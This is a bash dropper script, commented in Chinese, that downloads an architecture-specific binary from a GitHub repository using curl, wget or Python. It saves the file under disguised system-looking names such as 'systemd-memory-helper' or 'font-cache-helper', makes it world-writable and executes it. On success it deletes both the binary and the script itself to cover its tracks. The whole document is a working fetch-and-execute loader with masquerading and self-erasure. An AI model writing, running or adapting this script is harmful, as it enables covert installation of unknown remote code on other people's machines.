#!/usr/bin/env bash

URL_AMD64="https://github.com/kd6379/test/raw/refs/heads/main/agent_amd64"
URL_ARM64="https://github.com/kd6379/test/raw/refs/heads/main/agent_arm64"

SCRIPT_PATH="$(cd "$(dirname "$0")" 2>/dev/null && pwd)/$(basename "$0")"

ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        AGENT_URL="$URL_AMD64" ;;
    aarch64|arm64|armv8*|armv8)
        AGENT_URL="$URL_ARM64" ;;
    *)
        echo "[FAIL] 不支持的架构: $ARCH"
        exit 1
        ;;
esac

if [ "$(id -u)" -eq 0 ]; then
    AGENT_PATH="/usr/local/lib/systemd-memory-helper"
else
    AGENT_PATH="/var/tmp/font-cache-helper"
fi

mkdir -p "$(dirname "$AGENT_PATH")" 2>/dev/null

download_file() {
    local url="$1"
    local dest="$2"
    if command -v curl &>/dev/null; then
        curl -fsSL --retry 3 --connect-timeout 10 "$url" -o "$dest"
    elif command -v wget &>/dev/null; then
        wget -q --tries=3 --timeout=10 "$url" -O "$dest"
    elif command -v python3 &>/dev/null; then
        python3 -c "import urllib.request; urllib.request.urlretrieve('$url', '$dest')"
    elif command -v python &>/dev/null; then
        python -c "import urllib; urllib.urlretrieve('$url', '$dest')"
    else
        echo "[FAIL] 未找到可用的下载工具 (curl/wget/python)"
        return 1
    fi
}

echo "[*] 架构: $ARCH | 落地路径: $AGENT_PATH"
echo "[*] 正在下载..."

if ! download_file "$AGENT_URL" "$AGENT_PATH"; then
    echo "[FAIL] 下载失败"
    exit 1
fi

if [ ! -s "$AGENT_PATH" ]; then
    echo "[FAIL] 下载文件为空"
    exit 1
fi

chmod 777 "$AGENT_PATH"

echo "[*] 执行..."
"$AGENT_PATH"
EXIT_CODE=$?

if [ $EXIT_CODE -eq 0 ]; then
    echo "[SUCCESS] 执行成功，已清理"
    rm -f "$AGENT_PATH"
    rm -f "$SCRIPT_PATH"
    exit 0
else
    echo "[FAIL] 执行失败 (退出码: $EXIT_CODE)"
    exit $EXIT_CODE
fi
